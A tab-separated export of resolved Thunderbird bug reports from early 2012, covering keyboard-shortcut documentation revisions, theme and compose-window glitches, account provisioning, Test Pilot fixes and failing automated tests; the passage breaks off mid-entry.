721666%TAB%1327624747%TAB%273994%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Help Documentation%TAB%TB: Keyboard Shortcuts documentation: Major Revision #....: add lots of missing shortcuts (esp. for composition), regroup message functions, add subsection table headings, add article navigation and TOC,TB: Keyboard Shortcuts documentation: Major Revision #5658: add lots of missing shortcuts (esp. for composition), regroup message functions, add subsection table headings, add article navigation and TOC%TAB%TB: Keyboard Shortcuts documentation: Major Revision #....: add lots of missing shortcuts (esp. for composition), regroup message functions, add subsection table headings, add article navigation and TOC,TB: Keyboard Shortcuts documentation: Major Revision #5658: add lots of missing shortcuts (esp. for composition), regroup message functions, add subsection table headings, add article navigation and TOCThis bug is intended for details and discussion of a major revision of the Keyboard Shortcuts documentation article (1) which I am about to land (and I want to link here from that revision's comment, so I need this bug first). Please find the URL of that revision in the URL field or subsequent comments.  With this revision, after many hours if not days of work, I'll land a wide range of major improvements:  - add about 30 shortcuts that were missing (bug 716254), especially for, but not limited to composition - major regrouping of shortcuts in "message functions" section - add separate section for "Search and filter functions" (they are too important to be lost in the crowd) - conflate "Newsgroup messages" section with only 3 newsgroup-specific commands into "Message functions" section (the old structure was logically misleading because all message functions also apply to newsgroup messages) - add subsection table headings to all sections, group logically related functions (for meaningful and human-friendly navigation instead of endless one-for-all lists lacking recognizable structure - after all, this is a HELP document!) - add linkified TOC to this article (to allow fast-track navigation) - add linkified TOC for list of shortcuts (main section headings) - add links for quick navigation within shortcuts list, including inter-section cross-references - improve some command captions - fix/remove wrong/outdated keyboard shortcuts (done)  I'll add the bugs which I have improved or fixed with this revision as dependants of this bug (unless specified otherwise in subsequent comments). In very few cases, fixes and improvements might be preliminary or incomplete because I cannot verify shortcuts on Linux and MAC. I have filed respective bugs which are awaiting verification.  This revision is a major milestone as it concludes a series of major revisions to reconvert "Keyboards Shortcuts" into a useful document that keeps the promise with complete, accurate, and accessible information. Still, it may not be the end of the road (and nobody/nothing is perfect). For further refinements, pls refer to tbkbd-doc-tracker Bug 714031 and tbkbd-docnew-tracker Bug 714044. And please help to keep it up-to-date, by adding anything of relevance to tb-keyboard-tracker bug 713979 and tbkbd-doc-tracker Bug 714031.  Any hints or comments regarding this revision are welcome here.
721661%TAB%1327623795%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Build Config%TAB%Use a different wordmark and possibly other branding changes for Thunderbird 10 ESR%TAB%Use a different wordmark and possibly other branding changes for Thunderbird 10 ESR+++ This bug was initially created as a clone of Bug #720837 +++  We're going to adopt a wordmark for Thunderbird for the ESR releases. Most of this will probably be based on the changes Firefox are doing in bug 720837.
721506%TAB%1327580751%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Reader UI%TAB%Aero theme: Message summary toolbar looks crappy%TAB%Aero theme: Message summary toolbar looks crappy1. The message summary toolbar looks a bit too transparent. 2. There's an extra line on top that really shouldn't be there.
721381%TAB%1327558096%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Preferences%TAB%Create BigFiles storage account management tool%TAB%Create BigFiles storage account management toolBigFiles will allow users to leverage services like DropBox and YouSendIt when sending emails with large attachments.  (See bug 698925).  We need a management tool for all of those accounts. This bug will track progress on that work.
721369%TAB%1327555873%TAB%434096%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End,Account Manager%TAB%Dialog "Add Security Exception" does not show when autoconfiguring TB10,TB fails to verify SSL certs - Dialog "Add Security Exception" does not show when autoconfiguring TB10,Dialog "Add Security Exception" does not show when autoconfiguring TB10%TAB%Dialog "Add Security Exception" does not show when autoconfiguring TB10,TB fails to verify SSL certs - Dialog "Add Security Exception" does not show when autoconfiguring TB10,Dialog "Add Security Exception" does not show when autoconfiguring TB10User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:8.0) Gecko/20100101 Firefox/8.0 Iceweasel/8.0 Build ID: 20111130203257  Steps to reproduce:  Started TB10b4 on RHEL5 for the first time (i.e. no ~/.thunderbird), while having a autoconfig-file in [tb install dir]/isp/[my domain].xml  (this file points to an IMAP server that is using SSL, but the certificate is not trusted because the CA certificate has not (yet) been added to the list of trustworthy certs)  Entered my name, email-address, password (all correctly)  Pressed [Continue], configuration was taken from the aforementioned XML-file  Pressed [Create Account] (tried multiple times)   Actual results:  Error message "Configuration could not be verified -- is the username or password wrong?" appeared, and the text "Username or password invalid" next to the password-field.   Expected results:  As in TB3, the "Add Security Exception" should have appeared, and after confirming that I /do/ trust the server, I should have been able to continue creating my account.
721365%TAB%1327554862%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Folder and Message Lists%TAB%Make AddMsgUrlToNavigateHistory scriptable%TAB%Make AddMsgUrlToNavigateHistory scriptableI need this for Conversations to be able to interact with the back/forward buttons.
721317%TAB%1327539003%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%OS Integration%TAB%Port work to use Quirks mode on mac when hardware acceleration is enabled%TAB%Port work to use Quirks mode on mac when hardware acceleration is enabledAlthough we don't enable hardware acceleration by default, I'd still like to port the changes that have been done for Firefox to keep in sync, and if anyone does in the future enable hardware acceleration in Thunderbird, we'll do the right thing by default.  The bugs are:  Bug 711658 - Trigger Quirks earlier in the startup process. Bug 687864 - Add offline renderer awareness for Mac OGL
721249%TAB%1327503195%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Tab-bar buttons are slightly too small%TAB%Tab-bar buttons are slightly too smallCompared to Firefox, the buttons on the tab bar are slightly too small:  1) There's a top margin that makes them shorter than they should be 2) There's a 1px gap between the bottom of the hover gradient and the tab bar (see attached screenshot) This patch removes the 3px top-margins. Additionally I made the tabs the same height as Firefox (27px instead of 26px) and cleaned the files from remnants of pre tabs-on-top time. I moved the #print-preview-toolbar definition from primaryToolbar-aero.css to messenger-aero.css because it wasn't used there. On every file I touched I removed the 'all and' from the media queries (see Bug 713822).
721071%TAB%1327478643%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Testing Infrastructure%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-eml-subject.js | test-eml-subject.js::test_eml_normal_subject%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-eml-subject.js | test-eml-subject.js::test_eml_normal_subjectThis just showed up on our trunk builds, with the following error message:  SUMMARY-UNEXPECTED-FAIL | test-eml-subject.js | test-eml-subject.js::test_eml_normal_subject   EXCEPTION: a != b: 'An email' != 'An email - Daily'.     at: test-folder-display-helpers.js line 2842        assert_true(false,"a != b: 'An email' != 'An email - Daily'.") test-folder-display-helpers.js 2842        assert_equals("An email","An email - Daily") test-folder-display-helpers.js 2829        check_eml_window_title("An email","./evil.eml") test-eml-subject.js 31        test_eml_normal_subject() test-eml-subject.js 40             frame.js 557             frame.js 626             frame.js 669             frame.js 497             frame.js 675             server.js 179             server.js 183  This seems to be related to the patch for bug 523321.
720724%TAB%1327393400%TAB%12809%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Testing Infrastructure,Security%TAB%"A week in the life of Thunderbird" launch live%TAB%"A week in the life of Thunderbird" launch livePut "A week in the life of Thunderbird" live on server.
720420%TAB%1327311803%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Reader UI%TAB%Context menu in Compose Window has non-functional and unrelated options%TAB%Context menu in Compose Window has non-functional and unrelated optionsSteps to reproduce:  1)  Open up an email message in a new window (right click on the message, choose "Open Message in New Window") 2)  Right click on the message text  What happens?  A massive context menu comes up, with options for doing things that make no sense in the context of the message ("Play", "Mute", "Unmute", "Reply to Newsgroup", etc).  What's expected?  A smaller list should appear, with options that only make sense in the context of the message I'm viewing.
720379%TAB%1327303348%TAB%273994%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Help Documentation%TAB%TB: Keyboard Shortcuts documentation: Major Revision #.... (based on revision #5594),TB: Keyboard Shortcuts documentation: Major Revision #5614 (based on revision #5594): content and markup cleanup%TAB%TB: Keyboard Shortcuts documentation: Major Revision #.... (based on revision #5594),TB: Keyboard Shortcuts documentation: Major Revision #5614 (based on revision #5594): content and markup cleanupThis bug is intended for details and discussion of a major revision of the Keyboard Shortcuts documentation article which I am about to land (and I want to try linking here from that revision's comment, so I need this bug first). Please find the URL of that revision in the URL field or subsequent comments.  I created this major revision based on sreepriya's great foundational work in revision 5594 (2) which conflated the markup by 32% (from 14682 down to 9912 characters) in spite of adding content. That revision makes the markup just so much more readable and easier to maintain:  - correct markup for keyboard shortcuts: e.g. nifty {key Ctrl+Shift+Tab} instead of wrong and bulky {button Ctrl} + {button Shift} + {button Tab}  - correct markup for identical cross-OS shortcuts: e.g. slim {for win,linux}{key...}{/for}{for mac}{key...}{/for} instead of redundant and confusing {for win}{key...}{/for}{for mac}{key...}{/for}{for linux}{key...}{/for}  I'll approve sreepriya's revision 5594 (2) to acknowledge and preserve this revolutionary improvement. It comes with a number of minor glitches which I will fix with my upcoming revision documented here.  In addition, I have once again fixed a whole lot of previously existing issues: - fix/improve wrong/misleading/insufficient command captions - fix/remove wrong/outdated keyboard shortcuts (wip) - add product version selectors for some shortcuts that changed (what's the point of having the version selector if we don't maintain it?) - minor changes to the sequence of shortcuts in the list (wip) - add OS-sensitive markup in the introduction - cross the t's and dot the i's in the markup, removing extra spaces etc.  I might add the bugs which I have touched with this revision as dependants of this bug (unless specified otherwise in subsequent comments). In some cases, fixes and improvements might be preliminary or incomplete because I can't verify shortcuts on Linux and MAC. I have filed respective bugs which are awaiting verification.  The revision documented here is an incremental update but it's not the end of the road. A lot more needs to be done, pls refer to tbkbd-doc-tracker Bug 714031 and tbkbd-docnew-tracker Bug 714044 for details.  Any hints or comments regarding this revision are welcome here.
720341%TAB%1327288788%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Fix error downloading Test Pilot tests and fix the endless "Loading, please wait..." message%TAB%Fix error downloading Test Pilot tests and fix the endless "Loading, please wait..." messageFixing two issues in one patch here as its easiest and they were resolved together.  First:  Error: no element found Source file: https://testpilot.mozillalabs.com/testcases/index-tb.json Line: 1  This is generated because the xml parser thinks its getting a .html file not a plain text file, we can force this formatting server side or client side, but I've chosen server side for now.  Second:  When test pilot hasn't got any studies listed in index-tb.json (like is currently the case), it displays "Loading, please wait" in the list of studies forever. I've found this to be a bogus check for zero length on the list of studies.  I've checked this with Jono and he thinks it is fine to remove that check.
719413%TAB%1326949271%TAB%420324%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Editor,Message Compose Window%TAB%Paste Disabled After Copy from a Source That Is Not a Thunderbird Compose Window,Paste Disabled After Copy from a Source That Is Not a Thunderbird Compose Window (context menu problem)%TAB%Paste Disabled After Copy from a Source That Is Not a Thunderbird Compose Window,Paste Disabled After Copy from a Source That Is Not a Thunderbird Compose Window (context menu problem)This bug clone is to manage the front end UI fix for the Thunderbird paste problem; bug 330868 will carry Ehsan's fixes for the X Windows cut buffer issues that trigger the bug on Linux and related platforms.  +++ This bug was initially created as a clone of Bug #330868 +++  User-Agent:       Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0 Mnenhy/0.7.3.0 Build Identifier: Thunderbird 1.5 (20051201)  If I copy text from a non-Thunderbird window to paste into the Thunderbird composition window, the Paste option in the right-click pull-down menu is sometimes disabled.  The Paste as Quote option is still enabled.    Reproducible: Sometimes  Steps to Reproduce: 1.  Mark and copy a block of text from a SeaMonkey window.   2.  Use right-click in a Thunderbird compose window to get the pull-down menu.     Actual Results:   The Paste option is disabled (gray).    Expected Results:   The Paste option should be enabled (black).    Ctrl-V (keyboard shortcut for Paste) still works.  This problem seems to occur more frequently if I have already entered some text into the compose window and if the copied text has a link behind it.
719008%TAB%1326863626%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Search%TAB%make it possible to make a new search from the search tab,Add search box to refine existing search or make a new search from global search results tab,Add gloda search box to refine existing search or make a new search from global search results tab,Add toolbar to global search results tab, with gloda search box to refine existing faceted search or start a new search%TAB%make it possible to make a new search from the search tab,Add search box to refine existing search or make a new search from global search results tab,Add gloda search box to refine existing search or make a new search from global search results tab,Add toolbar to global search results tab, with gloda search box to refine existing faceted search or start a new searchSpinning off #717261 Right now if you fail to find any results for what you're searching for, you just get a error message and needs to go back to the 3-pane tab and do a new search (that will open in a new tab, bug #716058). This becomes a lot of jumping back and forth. It would be great if it was possible to search from the search tab itself.
718962%TAB%1326850668%TAB%273994%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Help Documentation%TAB%TB: Wrong markup used in Keyboard Shortcuts Documentation: Should use {key Ctrl+keyx} instead of {button Ctrl} + {button keyx},TB: Wrong markup used in Keyboard Shortcuts Documentation: Should use {key Ctrl+keyx} instead of {button Ctrl} + {button keyx}, and conflate OS selectors: {for win,linux}%TAB%TB: Wrong markup used in Keyboard Shortcuts Documentation: Should use {key Ctrl+keyx} instead of {button Ctrl} + {button keyx},TB: Wrong markup used in Keyboard Shortcuts Documentation: Should use {key Ctrl+keyx} instead of {button Ctrl} + {button keyx}, and conflate OS selectors: {for win,linux}sreepriya1111 intuitively did the correct thing in Bug 686436 Comment 3, and made me realize that we've done the wrong thing all along in the current markup of Keyboard Shortcuts documentation (1), since its inception (2): What a revelation!  Current Markup (e.g. for "Previous Tab" on Win/Unix): {button Ctrl} + {button Shift} + {button Tab}   Expected Markup: {key Ctrl+Shift+Tab}  Explanation:  As documented in the Markup-chart (3), there's a logical difference between the following:  {key keyx+keyy} explicitly for keyboard shortcuts (which will be parsed correctly as two separate buttons joined with a plus: [keyx] + [keyy]} {menu caption} for menus and {button caption} for normal buttons with a textual caption (dialogue or toolbar buttons)  Obviously, applying the correct markup will make the source of this document a *LOT* easier to maintain. Fixing this will go a long way in ensuring a better quality of this document in the future. Heck, I was wondering why the source of this had to be so complex, for a simple thing like keyboard shortcuts. And there's more to simplify, like combining Win & Unix into a single {for} where applicable, but that needs a separate bug.
718860%TAB%1326811417%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Use the "dummy" smart reply button in the message header customization dialog%TAB%Use the "dummy" smart reply button in the message header customization dialogThis was mentioned in bug 718342, and it's super-easy to fix, so let's just do it.
718812%TAB%1326803848%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Testing Infrastructure%TAB%TEST-UNEXPECTED-FAIL | test-install-xpi.js | timed out waiting for modal dialog%TAB%TEST-UNEXPECTED-FAIL | test-install-xpi.js | timed out waiting for modal dialogEXCEPTION: Timeout waiting for modal dialog to open.     at: utils.js line 429        TimeoutError("Timeout waiting for modal dialog to open.") utils.js 429        waitFor((function () this.waitingForOpen == null && this.monitorizeClose()),"Timeout waiting for modal dialog to open.",10000,100,[object Object]) utils.js 467        WindowWatcher_waitForModalDialog("Addons:Install",(void 0)) test-window-helpers.js 398        wait_for_modal_dialog("Addons:Install") test-window-helpers.js 631        test_install_xpi_offer() test-install-xpi.js 158             frame.js 557             frame.js 626             frame.js 669             frame.js 497             frame.js 675             server.js 179             server.js 183
718792%TAB%1326800176%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Account Manager%TAB%Disable account provisioning for Thunderbird 10,Disable account provisioning for Thunderbird 10/11,Disable account provisioning for Thunderbird until ready for release%TAB%Disable account provisioning for Thunderbird 10,Disable account provisioning for Thunderbird 10/11,Disable account provisioning for Thunderbird until ready for releaseDue to needing some more information and some more testing, we've decided not to ship Account Provisioning until Thunderbird 11.  This patch is to disable Account Provisioning in Thunderbird 10, hence will land on beta channel only. Then when TB 11 is merged across, it'll be re-enabled on beta channel automatically.
718640%TAB%1326779472%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%Account Provisioner link to view providers in other languages is always displayed%TAB%Account Provisioner link to view providers in other languages is always displayedWe display the link that allows users to choose providers in languages other than their own, even when no providers exist.  I noticed this after Sancus removed the fake Yandex entry from the provider list.
718486%TAB%1326710918%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%Make Account Provisioner XML handler only request the XML once.%TAB%Make Account Provisioner XML handler only request the XML once.This is a pretty serious bug that made itself known once we started live-testing against some of our account providers.  For one thing, the old code only considered XML where the contentType exactly matched "text/xml".  Next, it looks like we requested the XML twice - once to determine the content type, and a second time in order to invisibly parse / deal with the XML content.  That doesn't work if our providers dynamically generate the XML, and don't allow us to re-request it.
718480%TAB%1326709668%TAB%244254%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%unable to save new message as file [regression],Unable to save new message as file,Unable to save new message as file when subject is empty%TAB%unable to save new message as file [regression],Unable to save new message as file,Unable to save new message as file when subject is emptyUser Agent: Mozilla/5.0 (Ubuntu; X11; Linux i686; rv:9.0.1) Gecko/20100101 Firefox/9.0.1 Build ID: 20111221202246  Steps to reproduce:  TB 11.0a2(2012-01-15)   - Write new e-mail  - Menu File -> Save as -> File   Actual results:  nothing   Expected results:  open save dialog
718427%TAB%1326694820%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%fat line in compose window%TAB%fat line in compose windowI'm getting a fat (2px instead of 1px) line in the compose window between the Subject and the formatting toolbar.
718342%TAB%1326637215%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Message Reader UI%TAB%Add "Reply to Sender" button to message header for NNTP posts%TAB%Add "Reply to Sender" button to message header for NNTP postsCurrently, the reply button in the message header "replies" to the newsgroup. It also lets you "reply all" to the newsgroup and the poster, but there's no button to reply just to the poster. There's a menu item to do this, but no button. It's especially strange when you swap between a mailing list and a newsgroup, which are conceptually very similar, but have a different button layout.  This has been bugging me for a while, so I fixed it locally. Here's the patch for that. Strings might need some work, though.
718140%TAB%1326476849%TAB%258469%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Folder and Message Lists%TAB%Feature Request: Option to open feed items (e.g., RSS) directly in default browser,Option to open feed items (e.g., RSS) directly in default browser%TAB%Feature Request: Option to open feed items (e.g., RSS) directly in default browser,Option to open feed items (e.g., RSS) directly in default browserUser Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7  Steps to reproduce:  Double-click any item from a feed (e.g., Atom, RSS...) in a Thunderbird "Subscription" account.   Actual results:  After double-clicking, the feed item will open in either a new tab, a new message window or an existing message window, per "Tools > Options > Reading & Display > Open messages in:"  To jump to the webpage associated with the feed item, the user then clicks the "Website" link in the header section of the tab/window where the feed item opened.  At that point, the content associated with the feed item will be open in both a Thunderbird tab/window and also a browser tab/window. (Which ultimately means two tabs/windows to close, and the clutter is multiplied by however many feed items the user is in the habit of opening and then viewing in a browser rather than Thunderbird.)   Expected results:  When double-clicking a feed item, would like the option to open its "Website" header field directly in my default browser, without first spawning a new Thunderbird tab/window.  Akin to having an option for default functionality something like one or more of the following...     "View > Feed Message Body As... > In Browser"     secondary mouse click feed item > context menu: "Open Message in Browser"     "Tools > Options > Reading & Display > Open feed message in: > Browser"  Of course, the content of the feed item itself and the content of the linked "Website" header field are technically two distinct things. But I'm rarely interested in the feed item's own content, separate from the linked "Website" field. Also, the feed item's own content would still presumably be visible/previewed within Thunderbird's Message Pane (it that's open), and could be opened in a Thunderbird window using a secondary mouse click and choosing "Open Message in New Tab/New Window" from the context menu.
718139%TAB%1326476754%TAB%433229%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General,Toolbars and Tabs%TAB%Try to change a "Tag" name. You can add a Tag or remove "ALL" tags with a 'click'; why can't we remove 1 tag or change the name of a Tag with a 'click'?,From tags dropdown, no easy way to edit/rename/change tag caption or delete tag from list of tags (idea: add "Manage tags..." menu to tags dropdown)%TAB%Try to change a "Tag" name. You can add a Tag or remove "ALL" tags with a 'click'; why can't we remove 1 tag or change the name of a Tag with a 'click'?,From tags dropdown, no easy way to edit/rename/change tag caption or delete tag from list of tags (idea: add "Manage tags..." menu to tags dropdown)User Agent: Mozilla/5.0 (Windows NT 6.0; rv:9.0.1) Gecko/20100101 Firefox/9.0.1 Build ID: 20111220165912  Steps to reproduce:  A while back I made up some 'New' tags by clicking on "New Tag...".    Actual results:  Now I just want to change the name of a tag. No way! You can only click on "New Tag..." or "Remove All Tags". This is crazy.   Expected results:  Should be able with one 'click' to change the names of one of the tags or remove one of the tags; just like adding a "New Tag...". It's not rocket science.  It's ridiculous that there wasn't these options set up in the first place.
717976%TAB%1326445756%TAB%49577%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%[Thunderbird] Investigate getBrowserURL() which returns (SeaMonkey) "chrome://navigator/content/navigator.xul",Thunderbird getBrowserURL() may return (SeaMonkey) "chrome://navigator/content/navigator.xul"%TAB%[Thunderbird] Investigate getBrowserURL() which returns (SeaMonkey) "chrome://navigator/content/navigator.xul",Thunderbird getBrowserURL() may return (SeaMonkey) "chrome://navigator/content/navigator.xul"(Noticed while checking bug 717753.)  Code is: { 53 function getBrowserURL() { 54  55   try { 56     var prefs = Components.classes["@mozilla.org/preferences-service;1"] 57                          .getService(Components.interfaces.nsIPrefBranch); 58     var url = prefs.getCharPref("browser.chromeURL"); 59     if (url) 60       return url; 61   } catch(e) { 62   } 63   return "chrome://navigator/content/navigator.xul"; 64 } }  "browser.chromeURL" is obviously the right thing to try :-) "chrome://navigator/content/navigator.xul" is SeaMonkey specific ;-<  I'm not sure whether this function could be allowed to fail somehow. If not, maybe TB should provide a fake browser page documenting the "no browser" case? Or default to "chrome://messenger/content/messengercompose/messengercompose.xul"? ...  Ftr, { /mail/app/profile/all-thunderbird.js     * line 53 -- pref("browser.chromeURL", "chrome://messenger/content/messengercompose/messengercompose.xul"); }
717881%TAB%1326419030%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%The default tab icon used on Mac doesn't exist%TAB%The default tab icon used on Mac doesn't existWith a debug build I see this in my terminal: Chrome file doesn't exist: [...]/obj-tbird/mozilla/dist/DailyDebug.app/Contents/MacOS/chrome/toolkit/skin/classic/global/tree/item.png  An MXR search shows that this file is referenced from:  http://mxr.mozilla.org/comm-central/source/mail/themes/pinstripe/mail/tabmail.css#48 48 .tabmail-tab { 49   list-style-image: url("chrome://global/skin/tree/item.png"); 50 }  and from: 334 .alltabs-item { 335   list-style-image: url("chrome://global/skin/tree/item.png"); 336 }  This item.png file doesn't exist.  This seems to cause the alltabs menu item for the inbox and email messages to not have any icon. While the default icon should be fixed, we should probably also see why alltabs menuitem attempt to use it instead of the icon that these tabs have in the tab bar.
717402%TAB%1326286678%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Testing Infrastructure%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-about-support.js | test-about-support.js::*%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-about-support.js | test-about-support.js::*The patch for bug 631909 changed the string key "aboutSupport.modifiedPrefsTitle" on us, and broke our about:support.
717264%TAB%1326269321%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Mail Window Front End%TAB%Remove Quick Filter Bar toggle button from tab toolbar,Move Quick Filter Bar toggle button from tab toolbar to mail toolbar%TAB%Remove Quick Filter Bar toggle button from tab toolbar,Move Quick Filter Bar toggle button from tab toolbar to mail toolbarThe current placement of the QFB toggle button doesn't make a whole lot of sense.  It exists outside of the tab that it belongs to, and is disabled unless that tab is selected.  Blake and I are toying with the idea of removing the Quick Filter Bar button from the tab toolbar, and just having it exist as an optional button in the Customize Toolbar dialog.
717262%TAB%1326268947%TAB%278074%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Test Pilot,General%TAB%Test pilot notifications have broken / transparent UI in Thunderbird%TAB%Test pilot notifications have broken / transparent UI in ThunderbirdToday I got a test pilot notification for "A Week in the Life of a Mail Client" over my Thunderbird Daily session.  This popup was partly translucent and near-impossible to read.  Looks pretty horked.  Filing this bug on that.  System info:  - 32-bit Ubuntu 11.04 (with the default "Unity" desktop).  - Up-to-date Thunderbird Daily:     Mozilla/5.0 (X11; Linux i686; rv:12.0a1) Gecko/20120111 Thunderbird/12.0a1  - Test Pilot for Thunderbird 1.3.4  (bundled I believe; I don't recall explicitly installing it)  (Also, FWIW, I've been running Thunderbird Daily for months, and this is the first Test Pilot notification I've ever gotten there IIRC.)
717225%TAB%1326258594%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Figure out why folderTree.json is getting corrupted or keep a backup of it,Figure out why folderTree.json is getting corrupted or improve stability during writing,Figure out why folderTree.json is getting corrupted, and improve stability during writing,Figure out why folderTree.json is getting corrupted, and improve stability during writing by transfer to nsISafeOutputStream%TAB%Figure out why folderTree.json is getting corrupted or keep a backup of it,Figure out why folderTree.json is getting corrupted or improve stability during writing,Figure out why folderTree.json is getting corrupted, and improve stability during writing,Figure out why folderTree.json is getting corrupted, and improve stability during writing by transfer to nsISafeOutputStreamAs we saw in bug 707329, for some reason folderTree.json is getting corrupted, probably on system crashes.  In theory we should be writing out nice data to the file, so this shouldn't happen. However, we should ensure that we have the right methods for reducing the possibility of corruption, and possibly consider backups.
716796%TAB%1326140529%TAB%430515%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Thunderbird 9.0.1 triggers discrete graphics on Lion%TAB%Thunderbird 9.0.1 triggers discrete graphics on LionI have a new MacBookPro (model 8,2) with dynamic graphics card switching. When I start thunderbird (without any extensions) - the mac switches to discrete graphics which I think is unnecessary and drains the battery.  I found this out by running gfxCardStatus v2.1, and found that thunderbird-bin triggered the discrete graphics.
716621%TAB%1326106237%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%Folder labels with with new messages are misaligned in folder pane,Folder label/caption/name with new messages are misaligned in folder pane (is nearer to or overlaps the folder icon)%TAB%Folder labels with with new messages are misaligned in folder pane,Folder label/caption/name with new messages are misaligned in folder pane (is nearer to or overlaps the folder icon)It looks like labels for folders with new messages gets slighly misaligned with the rest of the labels. Just as a note, it seems like the text is pushed over, so it's likely not a problem with the icon.  My wild guess is that some image element has a space after it (or not), and that's what's causing the mis-alignment.
716481%TAB%1326073895%TAB%394943%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Spellcheck icon stays disabled if clicking on a mailto link with a subject parameter,Spellcheck icon stays disabled if clicking on a mailto link with a subject parameter, or replying (any action where the cursor starts in the body field)%TAB%Spellcheck icon stays disabled if clicking on a mailto link with a subject parameter,Spellcheck icon stays disabled if clicking on a mailto link with a subject parameter, or replying (any action where the cursor starts in the body field)User Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1 Build ID: 20111220165912  Steps to reproduce:  Clicking on a mailto-link with a subject parameter (with or without body parameter). See attached html-file for examples of such links.    Actual results:  A Thunderbird message compose window opens with the cursor already located in the mail body area. The spell check icon in the toolbar stays disabled (greyed out).    Expected results:  The spell check icon should be enabled. Like when you click on a normal mailto link (without parameters) and then manually move the cursor to the mail body area.
716270%TAB%1325935546%TAB%273994%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Help Documentation%TAB%TB: Add better link for direct downloading of keyconfig Addon to Keyboard Shortcuts documentation%TAB%TB: Add better link for direct downloading of keyconfig Addon to Keyboard Shortcuts documentationCurrent Documentation:  Thunderbird Keyboard Shortcuts documentation (1) currently has this:  ==Customizing keyboard shortcuts== The _Keyconfig extension_ allows you to configure keyboard shortcuts. (Note that third-party extensions are not supported or endorsed by Mozilla.)   STR  1) Try following the link to find the actual download for keyconfig extension  Actual result:  We are sending the user on a long and confusing odyssey in search for an actual download of the keyconfig addon:  _Keyconfig extension_ link from our shortcuts documentation points to 1) http://kb.mozillazine.org/Keyconfig_extension%3A_Thunderbird  On that page, there is still no download link for the extension, but a confusing link at the top, which wrongly points back to the mozillazine article itself: > For example, see: _Keyconfig extension_ 2) http://kb.mozillazine.org/Keyconfig_extension%3A_Thunderbird  User needs to parse the whole article or at least a long TOC to find anything which might link to the actual extension (if he is lucky): > 7 _External links_ (from TOC, points to bottom of page) 3) http://kb.mozillazine.org/Keyconfig_extension%3A_Thunderbird#External_links  Under "External links", we'll find > _KeyConfig thread_ in Extension/Theme releases forum  which then points to: 4) http://forums.mozillazine.org/viewtopic.php?f=48&t=72994  And there, finally, hidden inconspicously in the first post: > _keyconfig_ allows you to change keyboard shortcuts. [Firefox, Thunderbird, > SeaMonkey, and any other XULRunner Application] now pointing to the *actual* download: 5) http://mozilla.dorando.at/keyconfig.xpi  That's 5 links before getting what I actually want, and what was promised on our page. 4 too many.  Expected Result:  Add a direct download link for the extension, like this:  The _Keyconfig extension_ (*_download here_*) allows you to configure keyboard shortcuts. (Note that third-party extensions are not supported or endorsed by Mozilla.)   ..., where:  _Keyconfig extension_ still links to 1) http://kb.mozillazine.org/Keyconfig_extension%3A_Thunderbird (thus providing access to all the valuable resources of information mentioned above), but  _download here_ links directly to 
